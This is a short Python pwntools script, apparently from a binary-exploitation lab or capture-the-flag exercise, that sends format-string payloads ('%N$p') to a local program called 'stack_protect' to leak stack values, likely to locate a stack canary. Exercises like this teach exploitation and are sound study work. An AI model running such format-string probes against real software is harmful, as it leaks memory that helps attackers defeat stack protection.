from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./stack_protect', checksec=False)
exe = "./stack_protect"

# Let's fuzz 100 values
for i in range(10,27):
    try:
        # Create process (level used to reduce noise)
        p = process(exe)
        p.sendlineafter(b':', '%{}$p'.format(i).encode())
        # Receive the response
        p.recvuntil(b'\n')
        result = p.recvline()[:-1]
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass